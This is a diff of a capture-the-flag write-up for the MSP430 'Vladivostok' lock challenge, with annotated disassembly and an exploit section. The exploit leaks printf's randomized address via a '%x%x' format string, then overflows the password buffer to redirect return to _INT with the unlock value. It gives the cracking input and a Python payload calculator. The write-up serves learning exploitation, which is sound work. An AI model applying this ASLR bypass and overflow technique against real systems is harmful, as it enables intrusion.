@@ -1,9 +1,24 @@
 # Vladivostok - 100 points
  
 ## The idea
+ASLR - Address Space Layout Randomization.
 
 
 ## The way
+
+It can be seen by checking a black box that the program expects two inputs. Username and password
+
+<img src="./14.1.png" width="80%"></img>
+<img src="./14.2.png" width="80%"></img>
+
+When you start talking normally, you encounter the following scenario:
+
+<img src="./14.3.png"></img>
+
+Very traumatic... so there was no choice but to take the pre-run code to a text editor and analyze it statically.
+
+The following code snippet contains the functions relevant to the exercise while explaining in the comments I wrote. Immediately after, the summary of the program will appear, so there is no need to read everything
+
 
 ```arm
 4438 <main>
@@ -29,7 +44,7 @@
 4468:  3e50 00ff      add	#0xff00, r14
 446c:  0d4b           mov	r11, r13
 446e:  3d50 5c03      add	#0x35c, r13
-4472:  014e           mov	r14, sp
+4472:  014e           mov	r14, sp ; change also the stack location.
 4474:  0f4b           mov	r11, r15
 4476:  8d12           call	r13
 ;-------------------------------------------
@@ -38,8 +53,8 @@
 4484:  0a12           push	r10
 4486:  3182           sub	#0x8, sp
 4488:  0c4f           mov	r15, r12
-448a:  3c50 6a03      add	#0x36a, r12
-448e:  814c 0200      mov	r12, 0x2(sp)
+448a:  3c50 6a03      add	#0x36a, r12  ; r12 = address of new location of printf.
+448e:  814c 0200      mov	r12, 0x2(sp) ; insert the printf addr into the top of the stack (after 2 bytes) 
 4492:  0e43           clr	r14
 
 ; overwrite the code segment
@@ -48,7 +63,7 @@
 449a:  3e90 0010      cmp	#0x1000, r14
 449e:  fa23           jnz	$-0xa <_aslr_main+0x12>
 
-; insert '\Username (8 char max):' to memory in purpose to print it later.
+; insert 'Username (8 char max):' to memory in purpose to print it later.
 44a0:  f240 5500 0224 mov.b	#0x55, &0x2402 ;U
 44a6:  f240 7300 0324 mov.b	#0x73, &0x2403 ;s
 44ac:  f240 6500 0424 mov.b	#0x65, &0x2404 ;e
@@ -88,7 +103,7 @@
 4544:  0f4b           mov	r11, r15
 4546:  8f10           swpb	r15
 4548:  024f           mov	r15, sr
-454a:  32d0 0080      bis	#0x8000, sr             ; from line 93 - putchar letter by letter "Username (8 char max):"
+454a:  32d0 0080      bis	#0x8000, sr             ; putchar letter by letter "Username (8 char max):"
 454e:  b012 1000      call	#0x10
 4552:  3241           pop	sr
 4554:  3152           add	#0x8, sp
@@ -161,7 +176,7 @@
 ; printf the user input string and then 'clean the buffer'. (but, why?..)
 45de:  c24e 2e24      mov.b	r14, &0x242e  ; put 0 at the end of the user input string (0x2426 + 0x8 = 0x242e)
 45e2:  0b12           push	r11           ; r11=0x2426, pointer to user input string.
-45e4:  8c12           call	r12           ; printf?
+45e4:  8c12           call	r12           ; printf
 45e6:  2153           incd	sp
 45e8:  0f4b           mov	r11, r15      ; r15=0x2426, pointer to user input string.
 45ea:  033c           jmp	$+0x8 <_aslr_main+0x170>
@@ -197,7 +212,7 @@
 464e:  0f4c           mov	r12, r15
 4650:  8f10           swpb	r15
 4652:  024f           mov	r15, sr
-4654:  32d0 0080      bis	#0x8000, sr                        ; from line 203 - putchar letter by letter "\nPassword:"
+4654:  32d0 0080      bis	#0x8000, sr                        ; putchar letter by letter "\nPassword:"
 4658:  b012 1000      call	#0x10
 465c:  3241           pop	sr
 465e:  3152           add	#0x8, sp
@@ -239,7 +254,7 @@
 46aa:  3241           pop	sr
 46ac:  3152           add	#0x8, sp
 
-
+; check password. note: there is no printf or puts of the password..
 46ae:  3d50 7c00      add	#0x7c, r13
 46b2:  0c41           mov	sp, r12
 46b4:  0c12           push	r12
@@ -266,7 +281,7 @@
 46f8:  b240 0700 0024 mov	#0x7, &0x2400  ; put the length of the string before.
 46fe:  3d40 0224      mov	#0x2402, r13   ; r13 = pointer to the string.
 
-
+; print the string abouv
 4702:  103c           jmp	$+0x22 <_aslr_main+0x2a2>
 4704:  1d53           inc	r13
 4706:  8c11           sxt	r12
@@ -488,24 +503,74 @@
 48e8:  3b41           pop	r11
 48ea:  3041           ret
 ;-------------------------------------------
-4904 <INT>
-4904:  0c4f           mov	r15, r12
-4906:  0d12           push	r13
-4908:  0e12           push	r14
-490a:  0c12           push	r12
-490c:  0012           push	pc
-490e:  0212           push	sr
-4910:  0f4c           mov	r12, r15
-4912:  8f10           swpb	r15
-4914:  024f           mov	r15, sr
-4916:  32d0 0080      bis	#0x8000, sr
-491a:  b012 1000      call	#0x10
-491e:  3241           pop	sr
-4920:  3152           add	#0x8, sp
-4922:  3041           ret
+48ec <_INT>
+48ec:  1e41 0200      mov	0x2(sp), r14
+48f0:  0212           push	sr
+48f2:  0f4e           mov	r14, r15
+48f4:  8f10           swpb	r15
+48f6:  024f           mov	r15, sr
+48f8:  32d0 0080      bis	#0x8000, sr
+48fc:  b012 1000      call	#0x10
+4900:  3241           pop	sr
+4902:  3041           ret
 ```
+### Summary of program operation: ###
+* Function `main`:
+    * copies the code segment to a random location in memory
+    * also moves the cartridge to a random location
+    * call to `aslr_main`
+
+* Function `aslr_main`:
+    * calls to `_aslr_main`
+    * it means there is return value here on the stack. ⚠️
+
+* Function `_aslr_main`:
+    * push something with 0x4 bytes to the stack
+    * allocate 0x8 bytes on the stack
+        * so from the top of the stack untli the return value there is 0xc bytes.
+    * insert new location of `printf` address 2 bytes after the top of the stack ⚠️
+    * overwrite the original code section.
+    * get the username
+        * to the fixed address #0x2426
+    * prints the username
+        * using `printf`
+    * get the password
+        * up to 0x14 bytes.
+        * insert to address that is 4 bytes after the head of the stack
+        * so from the address of password until the return value there is (0xc - 0x4 =) 0x8 bytes. ⚠️
+    * check the password
+        * allways fail
+    * anyway, print "wrong"
+
+### How to exploit: ###
+
+We will put together what we know and pay attention to ⚠️:
+* In the password input we can overwrite the return address to `aslr_main`
+     * Bytes 0x8-0x9 of the password will be the address for `INT'
+     * Bytes 0xc-0xd of the password will be the value 0x007f to open the door.
+* But because of ASLR we don't know the current address of `_INT`.
+* So we will notice that looking at the stack, just before the call to `printf` for the username:
+     * The address of printf itself is 2 bytes from the top of the stack just before reading
+     * We can exploit the weakness of 'printf' as in previous challenges and print to the user the address of 'printf' using the string `%x%x`
+* When we have in hand the address of 'printf' we can easily calculate the address of `_INT`
+     * Because the original functions are copied to memory in the same order.
 
 ## The cracking input (as bytes)
 ```
+25782578
+```
+taking the `printf` address (remember the little endian) and run this python code for the second input.
 
+```python
+def calc_second_input(curr_printf):
+    original__INT = 0x483c
+    original_printf = 0x476a
+    curr__INT = curr_printf + (original__INT - original_printf)
+ 
+    # little endian...
+    curr__INT = hex(curr__INT)[4:] + hex(curr__INT)[2:4]
+ 
+    return '00' * 0x8 + ' ' + curr__INT + ' 0000 7f00'
+
+calc_second_input(int(input("\nEnter printf address: (0x____)\n"), 16))
 ```
